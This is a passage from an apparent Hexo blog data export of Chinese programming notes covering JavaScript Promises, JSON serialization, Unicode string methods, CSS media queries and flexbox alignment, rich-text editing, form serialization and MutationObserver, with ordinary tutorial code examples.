对象的回调链，不管以then方法或catch方法结尾，要是最后一个方法抛出错误，都有可能无法捕捉到（因为 Promise 内部的错误不会冒泡到全局）。因此，我们可以提供一个done方法，总是处于回调链的尾端，保证抛出任何可能出现的错误。 12345678910111213asyncFunc() .then(f1) .catch(r1) .then(f2) .done();Promise.prototype.done=function(onResolved,onRejected)&#123; this.then(onResolved,onRejected) .catch(function(reason)&#123; //抛出一个全局错误 setTimeout(()=&gt;&#123;throw reason&#125;,0); &#125;); &#125; finallyfinally()f方法用于指定不管Promise对象最后状态如何，都会执行的操作，它接受一个普通的回调函数作为参数，该函数不管怎样都必须执行。 123456789101112server.listen(0) .then(function () &#123; // run test &#125;) .finally(server.stop);Promise.prototype.finally=function(callback)&#123; let P=this.constructor; return this.then( value=&gt;P.resolve(callback()).then(()=&gt;value), reason=&gt;P.resolve(callback()).then(()=&gt;&#123;throw reason&#125;) ); &#125; 用途将图片的加载写成一个Promise，一旦加载完成，Promise的状态发生变化 123456789//加载图片 const preloadImage=function(path)&#123; return new Promise(function(resolve,reject)&#123; const image=new Image(); image.onload=resolve; image.onerror=reject; image.src=path; &#125;) &#125;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"json","slug":"json","date":"2022-01-04T08:03:00.000Z","updated":"2022-01-04T09:00:12.474Z","comments":true,"path":"2022/01/04/json/","link":"","permalink":"https://coloey.github.io/2022/01/04/json/","excerpt":"","text":"把它当成一种数据格式，而不是编程语言。JSON 不属于 JavaScript，它们只是拥有相同的语法而已。JSON 也不是只能在 JavaScript 中使用，它是一种通用数据格式。很多语言都有解析和序列化 JSON 的内置能力。 语法 简单值：字符串、数值、布尔值和 null 可以在 JSON 中出现，就像在 JavaScript 中一样。特殊值 undefined 不可以。 对象：第一种复杂数据类型，对象表示有序键/值对。每个值可以是简单值，也可以是复杂类型。 数组：第二种复杂数据类型，数组表示可以通过数值索引访问的值的有序列表。数组的值可以是任意类型，包括简单值、对象，甚至其他数组。 简单值JavaScript 字符串与 JSON 字符串的主要区别是，JSON 字符串必须使用双引号（单引号会导致语法错误）。布尔值和 null 本身也是有效的 JSON 值 对象与 JavaScript 对象字面量相比，JSON 主要有两处不同。首先，没有变量声明（JSON 中没有变量）。其次，最后没有分号（不需要，因为不是 JavaScript 语句）。同样，用引号将属性名包围起来才是有效的JSON。属性的值可以是简单值或复杂数据类型值，后者可以在对象中再嵌入对象. 123456789&#123;&quot;name&quot;: &quot;Nicholas&quot;,&quot;age&quot;: 29,&quot;school&quot;: &#123;&quot;name&quot;: &quot;Merrimack College&quot;,&quot;location&quot;: &quot;North Andover, MA&quot;&#125;&#125; 数组数组在 JSON 中使用 JavaScript 的数组字面量形式表示. JavaScript 12let values = [25, &quot;hi&quot;, true]; Json 1[25,&quot;hi&quot;,true] JavaScript序列化为Jsonstringfy()：在序列化 JavaScript 对象时，所有函数和原型成员都会有意地在结果中省略。此外，值为 undefined的任何属性也会被跳过。最终得到的就是所有实例属性均为有效 JSON 数据类型的表 1234567891011let book = &#123;title: &quot;Professional JavaScript&quot;,authors: [&quot;Nicholas C. Zakas&quot;,&quot;Matt Frisbie&quot;],edition: 4,year: 2017&#125;;let jsonText = JSON.stringify(book); 结果： {“title”:”Professional JavaScript”,”authors”:[“Nicholas C. Zakas”,”Matt Frisbie”],“edition”:4,”year”:2017} 还可以接收两个参数。这两个参数可以用于指定其他序列化 JavaScript 对象的方式。第一个参数是过滤器，可以是数组或函数；第二个参数是用于缩进结果 JSON 字符串的选项。 1234567891011let book = &#123;title: &quot;Professional JavaScript&quot;,authors: [&quot;Nicholas C. Zakas&quot;,&quot;Matt Frisbie&quot;],edition: 4,year: 2017&#125;;let jsonText = JSON.stringify(book, [&quot;title&quot;, &quot;edition&quot;]); 如果第二个参数是一个函数，则行为又有不同。提供的函数接收两个参数：属性名（key）和属性值（value）。可以根据这个 key 决定要对相应属性执行什么操作。这个 key 始终是字符串，只是在值不属于某个键/值对时会是空字符串 返回的值就是相应 key 应该包含的结果。注意，返回 undefined 会导致属性被忽略 1234567891011121314151617181920212223242526let book = &#123;title: &quot;Professional JavaScript&quot;,authors: [&quot;Nicholas C. Zakas&quot;,&quot;Matt Frisbie&quot;],edition: 4,year: 2017&#125;;let jsonText = JSON.stringify(book, (key, value) =&gt; &#123;switch(key) &#123;case &quot;authors&quot;:return value.join(&quot;,&quot;)case &quot;year&quot;:return 5000;case &quot;edition&quot;:return undefined;default:return value;&#125;&#125;);/*&#123;&quot;title&quot;:&quot;Professional JavaScript&quot;,&quot;authors&quot;:&quot;Nicholas C. Zakas,MattFrisbie&quot;,&quot;year&quot;:5000&#125;*/ JSON.stringify()方法的第三个参数控制缩进和空格。在这个参数是数值时，表示每一级缩进的空格数。 123456789101112let book = &#123;title: &quot;Professional JavaScript&quot;,authors: [ &quot;Nicholas C. Zakas&quot;, &quot;Matt Frisbie&quot;],edition: 4,year: 2017&#125;;let jsonText = JSON.stringify(book, null, 4); toJSON():在要序列化的对象中添加 toJSON()方法，序列化时会基于这个方法返回适当的 JSON 表示: 12345678910111213let book = &#123;title: &quot;Professional JavaScript&quot;,authors: [&quot;Nicholas C. Zakas&quot;,&quot;Matt Frisbie&quot;],edition: 4,year: 2017,toJSON: function() &#123;//箭头函数不能定义toJSON(),因为剪头函数的词法作用域是全局作用域，在这种情况不合适return this.title;&#125;&#125;;let jsonText = JSON.stringify(book);//book对象返回图书的书名(this.title) toJSON()方法可以与过滤函数一起使用，在把对象传给 JSON.stringify()时会执行如下步骤。 (1) 如果可以获取实际的值，则调用 toJSON()方法获取实际的值，否则使用默认的序列化。(2) 否则，使用默认序列化时，如果提供了第二个参数，则应用过滤。(3) 第(2)步返回的每个值都会相应地进行序列化。(4) 如果提供了第三个参数，则相应地进行缩进。 ES6中堆JSON.stringfy的改造UTF-8 标准规定，0xD800到0xDFFF之间的码点，不能单独使用，必须配对使用。比如，\\uD834\\uDF06是两个码点，但是必须放在一起配对使用，代表字符𝌆。这是为了表示码点大于0xFFFF的字符的一种变通方法。单独使用\\uD834和\\uDFO6这两个码点是不合法的，或者颠倒顺序也不行，因为\\uDF06\\uD834并没有对应的字符。 JSON.stringify()的问题在于，它可能返回0xD800到0xDFFF之间的单个码点。 1JSON.stringify(&#x27;\\u&#123;D834&#125;&#x27;) // &quot;\\u&#123;D834&#125;&quot; 为了确保返回的是合法的 UTF-8 字符，ES2019 改变了JSON.stringify()的行为。如果遇到0xD800到0xDFFF之间的单个码点，或者不存在的配对形式，它会返回转义字符串，留给应用自己决定下一步的处理。 1JSON.stringify(&#x27;\\u&#123;D834&#125;&#x27;) // &quot;&quot;\\\\uD834&quot;&quot;JSON.stringify(&#x27;\\uDF06\\uD834&#x27;) // &quot;&quot;\\\\udf06\\\\ud834&quot;&quot; 解析选项JSON.parse():接收一个参数，这个函数称为还原函数，还原函数接收两个参数，属性名key和属性名value，如果还原函数返回undefined，则结果中删除相应键，如果返回了其他任何值，则该值就会成为相应键的值插入到结果中。 123456789101112131415let book = &#123;title: &quot;Professional JavaScript&quot;,authors: [&quot;Nicholas C. Zakas&quot;,&quot;Matt Frisbie&quot;],edition: 4,year: 2017,releaseDate: new Date(2017, 11, 1)&#125;;let jsonText = JSON.stringify(book);let bookCopy = JSON.parse(jsonText,(key, value) =&gt; key == &quot;releaseDate&quot; ? new Date(value) : value);alert(bookCopy.releaseDate.getFullYear());//对象仙贝序列化为JSON字符串，又被重新解析为一个对象bookCopy,还原函数查找&quot;releaseDate&quot;键，找到后根虎日期字符创建新的Date对象，得到的bookCopy.releaseDate属性又变回Date对象，可以调用其getFullYear()方法","categories":[],"tags":[]},{"title":"字符表示","slug":"字符表示","date":"2022-01-04T03:58:13.000Z","updated":"2022-01-04T04:14:36.508Z","comments":true,"path":"2022/01/04/字符表示/","link":"","permalink":"https://coloey.github.io/2022/01/04/%E5%AD%97%E7%AC%A6%E8%A1%A8%E7%A4%BA/","excerpt":"","text":"JavaScript字符表示JavaScript 字符串由 16 位码元（code unit）组成。对多数字符来说，每 16 位码元对应一个字符。换句话说，字符串的 length 属性表示字符串包含多少 16 位码元 JavaScript 字符串使用了两种 Unicode 编码混合的策略：UCS-2 和 UTF-16。对于可以采用 16 位编码的字符（U+0000~U+FFFF），这两种编码实际上是一样的。 查看指定码元charCodeAt()123456let message = &quot;abcde&quot;;// Unicode &quot;Latin small letter C&quot;的编码是 U+0063console.log(message.charCodeAt(2)); // 99// 十进制 99 等于十六进制 63console.log(99 === 0x63); // true 这个对应关系在扩展到 Unicode 增补字符平面时就不成立了。即 16 位只能唯一表示,65 536 个字符。这对于大多数语言字符集是足够了，在 Unicode 中称为基本多语言平面（BMP）。为了表示更多的字符，Unicode 采用了一个策略，即每个字符使用另外 16 位去选择一个增补平面。这种每个字符使用两个 16 位码元的策略称为代理对。 codePointAt()为正确解析既包含单码元字符又包含代理对字符的字符串，可以使用 codePointAt()来代替charCodeAt()。跟使用 charCodeAt()时类似，codePointAt()接收 16 位码元的索引并返回该索引位置上的码点（code point）。码点是 Unicode 中一个字符的完整标识。比如，”c”的码点是 0x0063，而”☺”的码点是 0x1F60A。码点可能是 16 位，也可能是 32 位，而 codePointAt()方法可以从指定码元位置识别完整的码点。 123456let message = &quot;ab☺de&quot;;console.log(message.codePointAt(1)); // 98console.log(message.codePointAt(2)); // 128522console.log(message.codePointAt(3)); // 56842console.log(message.codePointAt(4)); // 100 给定UTF-16码原创建字符fromCharCode()12345678910111213// Unicode &quot;Latin small letter A&quot;的编码是 U+0061// Unicode &quot;Latin small letter B&quot;的编码是 U+0062// Unicode &quot;Latin small letter C&quot;的编码是 U+0063// Unicode &quot;Latin small letter D&quot;的编码是 U+0064// Unicode &quot;Latin small letter E&quot;的编码是 U+0065console.log(String.fromCharCode(0x61, 0x62, 0x63, 0x64, 0x65)); // &quot;abcde&quot;// 0x0061 === 97// 0x0062 === 98// 0x0063 === 99// 0x0064 === 100// 0x0065 === 101console.log(String.fromCharCode(97, 98, 99, 100, 101)); // &quot;abcde&quot; fromCodePoint()fromCodePoint()：这个方法接收任意数量的码点，返回对应字符拼接起来的字符串 1234console.log(String.fromCharCode(97, 98, 55357, 56842, 100, 101)); // ab☺deconsole.log(String.fromCodePoint(97, 98, 128522, 100, 101)); // ab☺de normalize()规范化Unicode提供了 4种规范化形式，可以将类似上面的字符规范化为一致的格式，无论底层字符的代码是什么。这 4种规范化形式是：NFD（Normalization Form D）、NFC（Normalization Form C）、NFKD（Normalization Form KD）和 NFKC（Normalization Form KC）。可以使用 normalize()方法对字符串应用上述规范化形式，使用时需要传入表示哪种形式的字串：”NFD”、”NFC”、”NFKD”或”NFKC”。 通过比较字符串与其调用 normalize()的返回值，就可以知道该字符串是否已经规范化了 12345678910111213141516171819let a1 = String.fromCharCode(0x00C5),a2 = String.fromCharCode(0x212B),a3 = String.fromCharCode(0x0041, 0x030A);// U+00C5 是对 0+212B 进行 NFC/NFKC 规范化之后的结果console.log(a1 === a1.normalize(&quot;NFD&quot;)); // falseconsole.log(a1 === a1.normalize(&quot;NFC&quot;)); // trueconsole.log(a1 === a1.normalize(&quot;NFKD&quot;)); // falseconsole.log(a1 === a1.normalize(&quot;NFKC&quot;)); // true// U+212B 是未规范化的console.log(a2 === a2.normalize(&quot;NFD&quot;)); // falseconsole.log(a2 === a2.normalize(&quot;NFC&quot;)); // falseconsole.log(a2 === a2.normalize(&quot;NFKD&quot;)); // falseconsole.log(a2 === a2.normalize(&quot;NFKC&quot;)); // false// U+0041/U+030A 是对 0+212B 进行 NFD/NFKD 规范化之后的结果console.log(a3 === a3.normalize(&quot;NFD&quot;)); // trueconsole.log(a3 === a3.normalize(&quot;NFC&quot;)); // falseconsole.log(a3 === a3.normalize(&quot;NFKD&quot;)); // trueconsole.log(a3 === a3.normalize(&quot;NFKC&quot;)); // false 未规范化： 12345678let a1 = String.fromCharCode(0x00C5),a2 = String.fromCharCode(0x212B),a3 = String.fromCharCode(0x0041, 0x030A);console.log(a1, a2, a3); // Å, Å, Åconsole.log(a1 === a2); // falseconsole.log(a1 === a3); // falseconsole.log(a2 === a3); // false 选择同一种规范化形式可以让比较操作符返回正确的结果： 1234567let a1 = String.fromCharCode(0x00C5),a2 = String.fromCharCode(0x212B),a3 = String.fromCharCode(0x0041, 0x030A);console.log(a1.normalize(&quot;NFD&quot;) === a2.normalize(&quot;NFD&quot;)); // trueconsole.log(a2.normalize(&quot;NFKC&quot;) === a3.normalize(&quot;NFKC&quot;)); // trueconsole.log(a1.normalize(&quot;NFC&quot;) === a3.normalize(&quot;NFC&quot;)); // true","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"媒体查询","slug":"媒体查询","date":"2022-01-03T09:42:17.000Z","updated":"2022-01-03T12:40:52.057Z","comments":true,"path":"2022/01/03/媒体查询/","link":"","permalink":"https://coloey.github.io/2022/01/03/%E5%AA%92%E4%BD%93%E6%9F%A5%E8%AF%A2/","excerpt":"","text":"媒体查询常被用于以下目的： 有条件的通过 @media 和 @import at-rules 用CSS 装饰样式。 用media= 属性为,,和其他HTML元素指定特定的媒体类型。 语法媒体类型和任意数量的媒体特性表达式构成。 当媒体类型（如果指定）与在其上显示文档的设备匹配并且所有媒体功能表达式都计算为true时，媒体查询将计算为true。 涉及未知媒体类型的查询始终为false。 媒体类型描述设备的一般类别。除非使用 not 或 only 逻辑操作符，媒体类型是可选的，并且会（隐式地）应用 all 类型。 1all 适用于所有设备。 1print 适用于在打印预览模式下在屏幕上查看的分页材料和文档。 （有关特定于这些格式的格式问题的信息，请参阅分页媒体。） 1screen 主要用于屏幕。 1speech 主要用于语音合成器。 定位媒体类型12@media screen, print &#123; ... &#125;/*用两个媒体查询来同时定位屏幕和打印设备*/ 媒体特性描述了 user agent、输出设备，或是浏览环境的具体特征。媒体特性表达式是完全可选的，它负责测试这些特性或特征是否存在、值为多少。每条媒体特性表达式都必须用括号括起来。 逻辑操作符 not, and, 和 only 可用于联合构造复杂的媒体查询，您还可以通过用逗号分隔多个媒体查询，将它们组合为一个规则。 and and 操作符用于将多个媒体查询规则组合成单条媒体查询，当每个查询规则都为真时则该条媒体查询为真，它还用于将媒体功能与媒体类型结合在一起。 notnot运算符用于否定媒体查询，如果不满足这个条件则返回true，否则返回false。 如果出现在以逗号分隔的查询列表中，它将仅否定应用了该查询的特定查询。 如果使用not运算符，则还必须指定媒体类型。 注意：在Level 3中，not关键字不能用于否定单个媒体功能表达式，而只能用于否定整个媒体查询。 onlyonly运算符仅在整个查询匹配时才用于应用样式，并且对于防止较早的浏览器应用所选样式很有用。 当不使用only时，旧版本的浏览器会将screen and (max-width: 500px)简单地解释为screen，忽略查询的其余部分，并将其样式应用于所有屏幕。 如果使用only运算符，则还必须指定媒体类型。 , (逗号)逗号用于将多个媒体查询合并为一个规则。 逗号分隔列表中的每个查询都与其他查询分开处理。 因此，如果列表中的任何查询为true，则整个media语句均返回true。 换句话说，列表的行为类似于逻辑或or运算符。 定位媒体特性1234567/*当用户的主要输入机制（例如鼠标）可以悬停在元素上*/@media (hover: hover) &#123; ... &#125;@media (max-width: 12450px) &#123; ... &#125;/*CSS将适用于任何带有彩色屏幕的设备*/@media (color) &#123; ... &#125;/*限制为带有屏幕的设备,宽度至少为30 em的横向的设备*/@media screen and (min-width: 30em) and (orientation: landscape) &#123; ... &#125;","categories":[{"name":"HTML+CSS","slug":"HTML-CSS","permalink":"https://coloey.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"toggle","slug":"toggle","date":"2022-01-03T01:47:27.000Z","updated":"2022-01-03T12:40:32.389Z","comments":true,"path":"2022/01/03/toggle/","link":"","permalink":"https://coloey.github.io/2022/01/03/toggle/","excerpt":"","text":"DOMTokenList.toggle()DOMTokenList接口的toggle()方法从列表中删除一个给定的标记并返回false,如果标记不存在，则添加并且函数返回true tokenList.toggle(token,force); 参数：token:标记列表中你想探查并切换的DOMSring force(可选):Boolean值，设置后会将方法变成单向操作，如果设置为false，则会删除标记列表中匹配的给定标记，且不会再添加，如设置为true，则将在标记中添加给定标记，且不会再度删除 返回值：为布尔值 egHTML 1&lt;span class=&quot;a b&quot;&gt;classList is &#x27;a b&#x27;&lt;/span&gt; JavaScript 12345678910var span = document.querySelector(&quot;span&quot;);var classes = span.classList;span.onclick = function() &#123; var result = classes.toggle(&quot;c&quot;); if(result) &#123; span.textContent = &quot;&#x27;c&#x27; added; classList is now &#x27;&quot; + classes + &quot;&#x27;.&quot;; &#125; else &#123; span.textContent = &quot;&#x27;c&#x27; removed; classList is now &#x27;&quot; + classes + &quot;&#x27;.&quot;; &#125;&#125;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"align-self,align-item,align-content","slug":"对齐方式对比","date":"2022-01-03T01:42:03.000Z","updated":"2022-01-03T12:40:14.249Z","comments":true,"path":"2022/01/03/对齐方式对比/","link":"","permalink":"https://coloey.github.io/2022/01/03/%E5%AF%B9%E9%BD%90%E6%96%B9%E5%BC%8F%E5%AF%B9%E6%AF%94/","excerpt":"","text":"align-selfCSS属性 align-self 会对齐当前 grid 或 flex 行中的元素，并覆盖已有的 align-items 的值。In Grid, it aligns the item inside the grid area. 在 Flexbox 中，会按照 cross axis（当前 flex 元素排列方向的垂直方向）进行排列。 值auto:设置为父元素的 align-items 值。 normal: 效果取决于当前的布局模式: 绝对定位布局中，normal在绝对定位的替代元素上表现为start，在所有其他绝对定位元素上表现为stretch。 在绝对定位的静态元素上表现为stretch。 flex布局中表现为stretch。 在网格布局中表现为stretch,除了有部分比例或者一个固定大小的盒子的效果像start。 在块级和表格单元中无效。 flex-start:对齐到cross-axis的首端 flex-end:对齐到cross-axis的尾端 center:对齐到cross-axis的中间，如果该元素的 cross-size 尺寸大于 flex 容器，将在两个方向均等溢出。 safe:如果元素大小溢出对齐的容器，则将元素改为对齐，就像start unsafe:无论元素和对齐容器的相对大小如何都遵循给定的对齐值 egHTML 1234567891011&lt;section&gt; &lt;div&gt; Item#1 &lt;/div&gt; &lt;div&gt; Item#2 &lt;/div&gt; &lt;div&gt; Item#3 &lt;/div&gt;&lt;/section&gt; CSS 1234567891011121314151617section &#123; display: flex; align-items: center; height: 120px; background: beige;&#125;div &#123; height: 60px; background: cyan; margin: 5px;&#125;div:nth-child(3) &#123; align-self: flex-end; background: pink;&#125; align-itemsCSS align-items属性将所有直接子节点上的align-self值设置为一个组。 目前，Flexbox和CSS网格布局支持此属性。在Flexbox中，它控制十字轴上项目的对齐方式，在网格布局中，它控制块轴上项目的对齐方式。 align-contentalign-content 属性设置了浏览器如何沿着弹性盒子布局的纵轴和网格布局的主轴在内容项之间和周围分配空间。 123456789101112131415161718192021222324252627282930313233343536/* 基本位置对齐 *//*align-content不采用左右值 */align-content: center; /* 将项目放置在中点 */align-content: start; /* 最先放置项目 */align-content: end; /* 最后放置项目 */align-content: flex-start; /* 从起始点开始放置flex元素 */align-content: flex-end; /* 从终止点开始放置flex元素 *//* 默认对齐 */align-content: normal;/*基线对齐*/align-content: baseline;align-content: first baseline;align-content: last baseline;/* 分布式对齐 */align-content: space-between; /* 均匀分布项目 第一项与起始点齐平， 最后一项与终止点齐平 */align-content: space-around; /* 均匀分布项目 项目在两端有一半大小的空间*/align-content: space-evenly; /* 均匀分布项目 项目周围有相等的空间 */align-content: stretch; /* 均匀分布项目 拉伸‘自动’-大小的项目以充满容器 *//* 溢出对齐 */align-content: safe center;align-content: unsafe center;/* 全局属性 */align-content: inherit; /* 继承 */align-content: initial; /* 初始值 */align-content: unset; /* 未设置 */ justify-itemsjustify-items 属性为所有盒中的项目定义了默认的 justify-self ， 可以使这些项目以默认方式沿适当轴线对齐到每个盒子。 justify-contentjustify-content 属性定义了浏览器之间，如何分配顺着弹性容器主轴(或者网格行轴) 的元素之间及其周围的空间。 1234567891011121314151617181920212223242526272829303132/* Positional alignment */justify-content: center; /* 居中排列 */justify-content: start; /* Pack items from the start */justify-content: end; /* Pack items from the end */justify-content: flex-start; /* 从行首起始位置开始排列 */justify-content: flex-end; /* 从行尾位置开始排列 */justify-content: left; /* Pack items from the left */justify-content: right; /* Pack items from the right *//* Baseline alignment */justify-content: baseline;justify-content: first baseline;justify-content: last baseline;/* Distributed alignment */justify-content: space-between; /* 均匀排列每个元素 首个元素放置于起点，末尾元素放置于终点 */justify-content: space-around; /* 均匀排列每个元素 每个元素周围分配相同的空间 */justify-content: space-evenly; /* 均匀排列每个元素 每个元素之间的间隔相等 */justify-content: stretch; /* 均匀排列每个元素 &#x27;auto&#x27;-sized 的元素会被拉伸以适应容器的大小 *//* Overflow alignment */justify-content: safe center;justify-content: unsafe center;/* Global values */justify-content: inherit;justify-content: initial;justify-content: unset; justify-self[justify-self 在 Flexbox布局中失效]在主轴上，Flexbox将我们的内容作为一个组进行处理。 计算布置子元素所需的空间量，然后剩余空间可用于分配。 justify-content属性控制剩余空间的使用方式。 设置justify-content：flex-end，额外空间放在所有子元素之前，justify-content：space-around，它放在该维度的子元素的两侧，等等。 这意味着在Flexbox中，justify-self属性没有意义，因为我们总是处理移动整个元素组。 在十字轴上，align-self是有意义的，因为我们可能在该维度中的flex容器中有额外的空间，其中单个元素可以移动到开始和结束位置。","categories":[{"name":"HTML+CSS","slug":"HTML-CSS","permalink":"https://coloey.github.io/categories/HTML-CSS/"}],"tags":[]},{"title":"富文本","slug":"富文本","date":"2021-12-13T11:59:24.000Z","updated":"2021-12-30T07:18:06.906Z","comments":true,"path":"2021/12/13/富文本/","link":"","permalink":"https://coloey.github.io/2021/12/13/%E5%AF%8C%E6%96%87%E6%9C%AC/","excerpt":"","text":"富文本编辑在空白 HTML 文件中嵌入一个iframe。通过 designMode 属性，可以将这个空白文档变成可以编辑的，实际编辑的则是元素的 HTML。designMode 属性有两个可能的值：”off”（默认值）和”on”。设置为”on”时 富文本交互使用 document.execCommand()。这个方法在文档上执行既定的命令，可以实现大多数格式化任务。document.execCommand()可以接收 3 个参数：要执行的命令、表示浏览器是否为命令提供用户界面的布尔值和执行命令必需的值 12345678910// 在内嵌窗格中切换粗体文本样式frames[&quot;richedit&quot;].document.execCommand(&quot;bold&quot;, false, null);// 在内嵌窗格中切换斜体文本样式frames[&quot;richedit&quot;].document.execCommand(&quot;italic&quot;, false, null);// 在内嵌窗格中创建指向 www.wrox.com 的链接frames[&quot;richedit&quot;].document.execCommand(&quot;createlink&quot;, false,&quot;http://www.wrox.com&quot;);// 在内嵌窗格中为内容添加&lt;h1&gt;标签frames[&quot;richedit&quot;].document.execCommand(&quot;formatblock&quot;, false, &quot;&lt;h1&gt;&quot;); 富文本选择在内嵌窗格中使用 getSelection()方法，可以获得富文本编辑器的选区。这个方法暴露在document 和 window 对象上，返回表示当前选中文本的 Selection 对象 12345678910let selection = frames[&quot;richedit&quot;].getSelection();// 取得选中的文本let selectedText = selection.toString();// 取得表示选区的范围let range = selection.getRangeAt(0);// 高亮选中的文本let span = frames[&quot;richedit&quot;].document.createElement(&quot;span&quot;);span.style.backgroundColor = &quot;yellow&quot;;range.surroundContents(span); 通过表单提交富文本12345form.addEventListener(&quot;submit&quot;,(event)=&gt;&#123; let target=event.target; target.elements[&quot;comments&quot;].value=frames[&quot;richedit&quot;].document.body.innerHTML;//使用内嵌窗格 //target.elements[&quot;comments&quot;].value=document.getElementById(&quot;richedit&quot;).innerHTML;//使用contenteditable&#125;)","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"表单序列化","slug":"表单序列化","date":"2021-12-12T11:09:55.000Z","updated":"2021-12-30T07:17:55.272Z","comments":true,"path":"2021/12/12/表单序列化/","link":"","permalink":"https://coloey.github.io/2021/12/12/%E8%A1%A8%E5%8D%95%E5%BA%8F%E5%88%97%E5%8C%96/","excerpt":"","text":"表单在js中可以使用表单字段的type属性连同其name属性和value属性来进行序列化 字段名和值是 URL 编码的并以和号（&amp;）分隔。 禁用字段不会发送。 复选框或单选按钮只在被选中时才发送。 类型为”reset”或”button”的按钮不会发送。 多选字段的每个选中项都有一个值。 通过点击提交按钮提交表单时，会发送该提交按钮；否则，不会发送提交按钮。类型为”image”的元素视同提交按钮。 select元素的值是被选中option元素的 value 属性。如果元素没有 value 属性，则该值是它的文本 返回的结果是查询字符串的格式 1234567891011121314151617181920212223242526272829303132333435363738394041function serialize(form)&#123; let parts=[]; let optValue; for(let field of form.elements)&#123; switch(field.type)&#123; case &quot;select-one&quot;: case &quot;select-multiple&quot;: if(field.name.length)&#123; for(let option of field.options)&#123; if(option.selected)&#123; if(option.hasAttribute)&#123; optValue=(option.hasAttribute(&quot;value&quot;)?option.value:option.text); &#125;else&#123; optValue=(option.attributes[&quot;value&quot;].specified?option.value:option.text); &#125; parts.push(`$&#123;encodeURIComponent(field.name)&#125;=`+`$&#123;encodeURIComponent(optValue)&#125;`); &#125; &#125; &#125; break; case undefined://字段集 case &quot;file&quot;://文件输入 case &quot;submit&quot;://提交按钮 case &quot;reset&quot;://重置按钮 case &quot;button&quot;://自定义按钮 break; case &quot;radio&quot;://单选按钮 case &quot;checkbox&quot;://复选框 if(!field.checked)&#123;//没被选中，跳出switch，否则进入default分支，将字段的名字和值编码后添加进parts数组 break; &#125; default: //不包含没有名字的表单字段 if(field.name.length)&#123; parts.push(`$&#123;encodeURIComponent(field.name)&#125;=`+`$&#123;encodeURIComponent(field.value)&#125;`) &#125; &#125; &#125; return parts.join(&quot;&amp;&quot;);&#125;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"DOM编程","slug":"DOM-DOM编程","date":"2021-12-12T09:15:15.000Z","updated":"2022-01-24T08:12:45.132Z","comments":true,"path":"2021/12/12/DOM-DOM编程/","link":"","permalink":"https://coloey.github.io/2021/12/12/DOM-DOM%E7%BC%96%E7%A8%8B/","excerpt":"","text":"DOM编程动态脚本1234567891011function loadScriptString(code)&#123; var script=document.createElement(&quot;script&quot;); script.type=&quot;text/javascript&quot;; try&#123; script.appendChild(document.createTextNode(code));//旧版本的IE浏览器可能出问题 &#125;catch(ex)&#123; script.text=code; &#125; document.body.appendChild(script);&#125;loadScriptString(&quot;function sayHi()&#123;alert(&#x27;hi&#x27;);&#125;&quot;); 动态样式123456789101112function loadStyleString(css)&#123; let style=document.createElement(&quot;style&quot;); style.type=&quot;text/css&quot;; try&#123; style.appendChild(document.createTextNode(css)); &#125;catch(ex)&#123; style.styleSheet.cssText=css; &#125; let head=document.getElementsByTagName(&quot;head&quot;)[0]; head.appendChild(style);&#125;loadStyleString(&quot;body[background-color:red&#125;&quot;); 对于IE，要小心使用styleSheet.cssText，如果重用同一个style元素并设置该属性超过一次，则可能导致浏览器崩溃，将cssText设置为空字符串也可能导致浏览器崩溃 表单12345678910111213141516171819let table=document.createElement(&quot;table&quot;);table.border=1;table.width=&quot;100%&quot;;let tbody=document.createElement(&quot;tbody&quot;);table.appendChild(tbody);table.insertRow(0);tbody.rows[0].insertCell(0);tbody.rows[0].cells[0].appendChild(document.createTextNode(&quot;Cell 1,1&quot;));tbody.rows[0].insertCell(1);tbody.rows[0].cells[1].appendChild(document.createTextNode(&quot;Cell 2,1&quot;));table.insertRow(1);tbody.rows[1].insertCell(0);tbody.rows[1].cells[0].appendChild(document.createTextNode(&quot;Cell 1,2&quot;));tbody.rows[1].insertCell(1);tbody.rows[1].cells[1].appendChild(document.createTextNode(&quot;Cell 2,2&quot;));document.body.appendChild(table); NodeList12345let divs=document.getElementsByTagName(&quot;div&quot;);for(let i=0,len=divs.length;i&lt;len;i++)&#123; let div=doocument.createElement(&quot;div&quot;); document.body.appendChild(div);&#125;//避免导致无穷循环 Mutationobserver接口在DOM被修改时异步执行回调，使用MutationObserver可以观察整个文档，DOM树的一部分或某个元素 MutationObserver的实例通过调用MutationObserver构造函数并传入一个回调函数创建 1let observer=new MutationObserver(()=&gt;console.log(&#x27;DOM was mutated&#x27;)); observe()方法接收两个参数：要观察其变化的DOM节点，以及一个MutationObserverInit对象（用于控制观察哪些方面的变化，是一个键值对形式配置选项的字典） 12let observer=new MutationObserver(()=&gt;console.log(&#x27;&lt;body&gt; attributes changed&#x27;));observer.observe(document.body,&#123;attributes:true&#125;); body元素上任何属性发生变化都会被这个MutationObserver实例发现，然后异步执行注册的回调函数,body元素后代修改或其他非属性修改不会触发回调进入任务 123456let observer=new MutationObserver(()=&gt;console.log(&#x27;&lt;body&gt; attributes changed&#x27;));observer.observe(document.body,&#123;attributes:true&#125;);document.body.className=&#x27;foo&#x27;;console.log(&#x27;Changed body class&#x27;);//Changed body class//&lt;body&gt; attributes changed 回调与MutationRecord每次回调都会收到一个MutationRecord实例的数组,包含的信息发生了什么变化以及DOM哪一部分受到影响 123456789let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords));[observer.observe(document.body,&#123;attributes:true&#125;);document.body.setAttributeNS(&#x27;foo&#x27;,&#x27;bar&#x27;,&#x27;baz&#x27;);//连续修改多个MutationRecord实例，回调函数就会受到包含这些实例的数组，顺序为变化事件的顺序let observer=new MutationObserver((mutationRecords)=&gt;console.log(mutationRecords));observer.observe(document.body,&#123;attributes:true&#125;);document.body.className=&#x27;foo&#x27;;document.body.className=&#x27;bar&#x27;;//[MutationRecord, MutationRecord] disconnect()方法会停止此后变化事件的回调，也会抛弃已经加入任务队列要异步执行的回调 1234567891011let observer=new MutationObserver(()=&gt;console.log(&#x27;&lt;body&gt;attributes 